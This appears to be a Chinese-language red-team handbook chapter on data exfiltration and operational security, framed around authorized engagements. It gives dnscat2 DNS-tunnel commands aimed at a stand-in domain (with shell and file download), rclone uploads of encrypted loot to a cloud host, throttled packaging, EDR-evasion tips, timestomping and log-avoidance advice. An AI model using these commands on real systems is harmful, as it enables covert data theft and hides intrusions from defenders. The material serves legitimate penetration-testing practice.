# 数据渗出与 OPSEC

把拿到的数据安全带出来、且不把行动暴露给蓝方:授权边界 → DNS 隧道 → 加密云盘中转 → 协议伪装 → 打包与时间窗 → 收尾痕迹清理。

本文件工具:dnscat2(DNS 隧道)、rclone(加密云盘中转)、tar/split/pv/rsync(打包限速)、exiftool(元数据清洗)。
关联文档:隧道与代理见 [06-隧道与代理.md](06-隧道与代理.md)(chisel/ligolo);落地传输见 [13-Windows落地工具箱.md](13-Windows落地工具箱.md)(SMB/certutil/base64);AMSI/免杀见 [20-免杀与EDR对抗.md](20-免杀与EDR对抗.md);驻留清理见 [17-Windows持久化.md](17-Windows持久化.md)。

## 圈定边界 — 授权范围 / 带宽预算 / 勿碰 PII(先于一切技术)

渗出是整个行动里法律风险最高的动作,动手前三条红线逐条对一遍,任何一条含糊就停下来问客户书面确认:

- **授权范围**:SOW/ROE 写明可访问网段、账户、数据类别与时间窗;"拿到域管"不等于"可以拖任意库"——超范围取的数据在报告里是负资产。只取证明目标(拿哈希不碰业务表、拿样本不拖全库)。
- **带宽预算**:按链路先算账再动手——DNS 隧道单次查询只有几十到几百字节,适合 KB~MB 级凭据/密钥,GB 级数据走 DNS 等于挂着横幅逛街;SOCKS 隧道/云盘中转按可用出口带宽的 **10–30%** 做预算(拉满是"这台机器在渗出"的直接信号),并把预估时长写进行动计划。
- **勿碰 PII**:能拿哈希不拿明文,能拿证明样本不拿全量;文档/截图先脱敏(去姓名/工号/手机号字段)再出网;渗出物登记台账(目录、大小、来源主机、时间),与 `~/tools/bin/log-cred.sh` 的凭据台账同一纪律——客户问"你们到底拷了什么"时能一条条答。

## dnscat2 — DNS 隧道渗出(服务端/客户端 -h 全实测)

来源:apt 包 dnscat2。本机事实:`/usr/bin/dnscat2-server` 是 64 字节包装脚本,内容为 `sudo ruby /usr/share/dnscat2/dnscat2.rb "$@"`(实测 cat)——绑 53 要 root,`-h` 直跑 `ruby /usr/share/dnscat2/dnscat2.rb` 实测;Linux 客户端 `/usr/bin/dnscat -h` 实测。Windows 侧客户端(dnscat.exe)官方仓库只给源码,需自行交叉编译,参数与 Linux 客户端同款(`--dns domain=...` 一套),落地方式走 13(SMB/base64 写入),别虚构现成 exe。

```bash
# ===== 服务端(攻击机,tmux 独立窗口跑——它是交互式控制台,不 daemon 化,"后台"= 换窗口 =====
# 前置:你控制的域名把 NS 记录指到攻击机权威解析(dnscat2 只当该域的权威端)
sudo dnscat2-server exfil.example.com                # 默认 0.0.0.0:53,监听指定域
sudo dnscat2-server --dns 'host=0.0.0.0,port=5353,domain=a.com,domain=b.com'  # 换端口/多域名
sudo dnscat2-server -c <预共享密钥> exfil.example.com # 强制认证(-e authenticated 默认随 -c 生效)
```

服务端参数(`dnscat2.rb -h` 实测):`-d/--dns host=,port=,domain=`(domain 可多次)· `-e/--security open|encrypted|authenticated`(客户端可选/强制加密/强制认证)· `-c/--secret` 预共享密钥防中间人 · `-p/--passthrough host:port` 未处理查询转发上游(掩护+不影响业务)· `-a/--auto-command` 客户端一连上自动下发 · `-u/--auto-attach` 自动进入会话 · `-r/--process` 每个会话挂指定进程 · `-k/--packet-trace` 抓包调试 · `-n/-s` 已废弃的监听地址/端口写法。

```bash
# ===== 客户端(目标侧;Linux 本机实测 dnscat -h,Windows dnscat.exe 同参数)=====
dnscat --dns domain=exfil.example.com,server=<攻击机IP>          # 基本回连
dnscat --dns domain=exfil.example.com,server=<IP>,type=TXT       # 指定记录类型(默认 TXT,CNAME,MX)
dnscat --ping --dns domain=exfil.example.com                     # 只探测服务端在不在
dnscat --secret <预共享密钥> --dns domain=exfil.example.com      # 与服务端 -c 配对加密认证
```

客户端参数(`/usr/bin/dnscat -h` 实测):`--delay <ms>` 包间隔(默认 1000,下限 50——**调大就是渗出限速**)· `--steady` 严格按间隔发包 · `--max-retransmits <n>`(默认 20)/`--retransmit-forever` 重传策略 · `--secret`/`--no-encryption` 加密开关 · `--exec <进程>`/`--command`/`--console` 会话形态 · `-d/-q/--packet-trace` 调试。

服务端控制台命令(controller 源码逐条核验):`windows` 列会话 → `window -i <id>` 进入;会话内 `shell`(弹交互 shell)、`exec/run/execute <命令>`、`download <远端文件>` 拉文件(客户端协议 COMMAND_DOWNLOAD/UPLOAD,二进制内实证)、`ping`、`listen` 起隧道、`set max-time` 等参数调节;`tunnels`/`stop`/`quit` 管理。

OPSEC:DNS 查询日志躺在递归服务器/DC 上(TXT 查询占比、随机子域长度、固定间隔突发都是审计点)——`--delay` 放缓、小体积分多次、取完即断;nslookup/curl 走 DNS 出网探测先行(Yakit DNSLog 也可,见 20)。

## rclone — 加密云盘中转:配置远程一条流 + serve 本机中转(v1.75.1 实测)

来源:`~/tools/bin/rclone` v1.75.1(`-h`/`version` 本机实测)。思路:目标→云盘、攻击机→云盘,两段合法 HTTPS,中间不暴露 C2 基础设施;crypt 层保证云盘上也是密文,账号被查也只见乱码。

```bash
# ===== 一条流配置远程(config create 实测;密码字段自动 obscure 落盘)=====
~/tools/bin/rclone config create od webdav url=https://dav.example.com vendor=other user=<用户> pass=<密码>
# 远程类型按目标换:webdav/sftp/ftp/s3/drive 等(serve -h 同套类型);OAuth 类需 --non-interactive 走 JSON 应答
~/tools/bin/rclone config create odc crypt remote=od:loot password=<加密口令> filename_encryption=standard directory_name_encryption=true
# crypt 层选项(rclone help backend crypt 实测):remote=底层远程:路径(必填)、filename_encryption
# standard(文件名加密)/obfuscate(混淆)/off、directory_name_encryption 目录名是否也加密

# ===== 上行:攻击机把战利品推上云(限速避免拉满出口)=====
~/tools/bin/rclone copy ~/tools/loot odc:2026-xx --bwlimit 500k -P        # --bwlimit 实测:KiB/s 或 B|K|M|G|T|P,支持时段表
~/tools/bin/rclone ls odc:2026-xx                                          # 校验远端清单

# ===== serve 本机中转:让深层内网主机经隧道(06 的 chisel/ligolo)直接拉/推 =====
~/tools/bin/rclone serve http odc: --addr 127.0.0.1:8080 --user <u> --pass <p> --read-only
# serve http 旗标(-h 实测):--addr 默认 127.0.0.1:8080、--user/--pass/--htpasswd 认证、--read-only 只读;
# 兄弟协议 serve -h 实测还有 ftp/sftp/webdav/nfs/s3/dlna/restic/docker 可换
```

目标侧用系统组件访问中转(certutil/iwr,见 13)或投放 rclone.exe 对拷——**rclone.exe 是 EDR 重点标记对象**(进程名+云盘域名双特征):改名投放、走 13 的传输法,或干脆只在攻击机侧用 rclone、目标侧走系统下载器。云端 OPSEC:对象版本历史/回收站/审计日志使"删了"≠删了,行动后走账号清理流程并与客户确认;凭据类小文件优先 dnscat2,云盘中转留给大件。

## 协议伪装 — 渗出流量装成正常业务(SMB/HTTPS 走 06,引用不重写)

通道本身见 06:chisel(HTTP 通道反 SOCKS)、ligolo(TUN 全协议)与 13 的"隧道下的 HTTP 下载"节——此处只补"装得像"的要点:

- **SMB/内网面**:域内机器互相走 admin share/IPC 是日常,`net use + copy` 经 impacket-smbserver(13 号)收件,比目标主动外连更像运维动作;横向搬运优先。
- **HTTPS 面要点清单**:User-Agent/Referer/Accept 头与真实业务或常见软件更新器一致(先抓样本再仿);Content-Type 与正文匹配(别 JSON 头二进制身);频率贴业务节奏(工作时间分批,别凌晨匀速狂跑);分卷大小随机、别整数对齐;域名优先租户真实解析过的 CDN/云存储(域前置类思路注意主流厂商已封,验证可用再上);长连接不如多次短会话像浏览器。
- **搭车已有同步**:目标机器若本来就跑 OneDrive/企业网盘客户端,把渗出物放进其同步目录让合法进程替你上传——EDR 对该进程的云流量白名单即你的掩护(仅在授权明确允许时用,证据链要能自证)。
- 验证手段:流量过 Yakit MITM(20 号③节)自检头与节奏,或 wireshark 对比正常样本。

## 打包与时间窗 — tar 分卷 / rsync·pv 限速(全实测)+ 拷贝窗口选型表

本机核验:`tar`/`split`/`pv`/`rsync` 全在(`rsync --help` 实测 `--bwlimit=RATE`;exiftool 13.55 在 `/usr/bin/exiftool`)。

```bash
# ===== 打包三步:清洗元数据 → 压缩分卷 → 校验 =====
exiftool -all= loot/*.docx loot/*.pdf        # 渗出前剥文档元数据(作者名/机器名/路径泄露重灾区,实测在机)
tar czf - loot/ | split -b 50m - loot.tgz.   # 50MB 分卷,断点可续传单卷
sha256sum loot.tgz.* > sums.txt              # 到达后逐卷校验
cat loot.tgz.* | tar xzf -                   # 对端合并解包

# ===== 限速拷贝(带宽预算落地)=====
rsync -av --bwlimit=512 loot/ user@jump:/tmp/loot/    # rsync 限速实测;断点续传+增量
tar czf - loot/ | pv -L 200k > /tmp/loot.tgz          # pv 限管道速率,管道中转场景
```

拷贝窗口选型表:

| 通道 | 带宽量级 | 适合体积 | 隐蔽性 | 备注 |
|---|---|---|---|---|
| DNS 隧道(dnscat2) | 极低(秒级 KB) | KB~MB 凭据/密钥 | 中(日志在递归侧) | `--delay` 限速;唯一出口只有 DNS 时的保底 |
| SOCKS 隧道 HTTP(06 chisel) | 中 | MB~百 MB | 中高(混在代理流量) | 配伪装头与限速 |
| 云盘中转(rclone+crypt) | 高(出口带宽) | GB 级大件 | 高(合法 HTTPS) | EDR 盯 rclone.exe;版本历史要清 |
| SMB 横向(13 smbserver) | 高(内网千兆) | 内网搬运任意 | 高(域内日常) | 只解决"聚拢",出口仍需上述通道 |
| 物理窗口(U 盘/维护窗口) | 最高 | 全量镜像 | 取决于门禁与监控 | 时间窗要写进 ROE |

窗口纪律:避开目标备份时段(全盘 I/O 会撞见你的文件);工作时间内小批多次优于深夜一次巨量;每批完成后核对台账与 sums。

## OPSEC 收尾 — 痕迹清单 / 时间线伪造思路 / 日志间隙 / 凭据时机(与 17 号互引)

驻留后门的逐条清理命令+检测点在 [17-Windows持久化.md](17-Windows持久化.md) 每节成对出现,此处是**渗出侧**的收尾清单,两表配合用:

| 痕迹类别 | 内容 | 处置 |
|---|---|---|
| 文件系统 | 工具本体、分卷临时件、Prefetch、$MFT/$LogFile、USN 日志 | 删除+`del /f /q`;分卷件勿留在 temp;USN/日志只能靠时间冲刷,列出给客户 |
| 时间线(MACE) | 新文件时间戳扎堆=行动时间表 | timestomp 思路见下 |
| 事件日志 | 4624/4672 登录、4663 文件访问、4688 进程、5140 共享访问 | 不删(1102=自首,13 号已述);靠窗口与轮转 |
| 网络侧 | 防火墙/代理会话记录、DNS 查询日志、云盘登录日志 | 攻击机侧重置/换出口;云侧版本清理 |
| 凭据 | 行动中用过的口令/哈希、新增账户 | 见下"重置时机" |

**时间线伪造(timestomp)思路**:目标是把行动产物的修改/访问/创建/写入(MACE)四时间对齐到同目录老文件,而不是清零(清零更可疑)。工具名与手法:meterpreter 自带 `timestomp` 命令(用法见 03 的 meterpreter 节);PowerShell 原生即可,无需第三方——`(Get-Item f).LastWriteTime = (Get-Item 同目录老文件).LastWriteTime`,CreationTime/LastAccessTime 同理三行;EXIF 侧元数据用 exiftool 清洗(本机 13.55,打包节已给命令)。注意 NTFS 的 $MFT/USN 记录不随 MACE 变,取证仍可还原——timestomp 是拖慢蓝方,不是隐身。

**日志间隙制造与检测差异**:删日志(`wevtutil cl`)必留 1102 日志清除事件,等于举手(13 号已述);靠"日志轮转/保留期自然覆盖"更稳——把动作排在保留期外读取不可及的时段前;但要认清 SIEM 差异:事件往往实时已上传云端,本地删了 SIEM 侧还有副本,所以对有 SIEM 的环境,唯一正解是**事件别发生**(LOLBins/系统上下文,见 20 号⑥节),而不是发生后擦。

**凭据重置时机**:行动期间**绝不重置**任何账户——改密触发 4724/4723 且原哈希立刻作废,既毁后续可用性又向蓝方举手;行动结束、双方确认战果后,统一轮换行动中触达过的凭据(含服务账户 krbtgt——DC 级动作后 krbtgt 要按微软流程两次重置),并把"哪些凭据需要轮换"写进报告交给客户执行;新增的账户/DLL/计划任务类痕迹按 17 号各节"清理命令+检测点"逐条销账,清完自查一遍(Autoruns/注册表查询)再撤场。
